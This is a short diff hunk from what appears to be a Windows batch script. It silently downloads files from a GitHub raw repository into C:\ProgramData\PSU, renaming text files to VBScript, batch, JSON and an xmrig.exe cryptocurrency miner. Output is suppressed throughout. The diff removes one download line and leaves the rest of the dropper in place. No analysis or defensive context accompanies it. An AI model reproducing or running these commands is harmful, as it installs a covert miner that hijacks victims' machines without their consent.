@@ -8,7 +8,6 @@ curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/check.txt" 
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/config.txt" -o "C:\ProgramData\PSU\config.json" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/execute.txt" -o "C:\ProgramData\PSU\execute.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/process.txt" -o "C:\ProgramData\PSU\process.bat" >> nul
-curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/run.txt" -o "C:\ProgramData\PSU\run.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs" >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe" >> nul
 timeout 1 >> nul
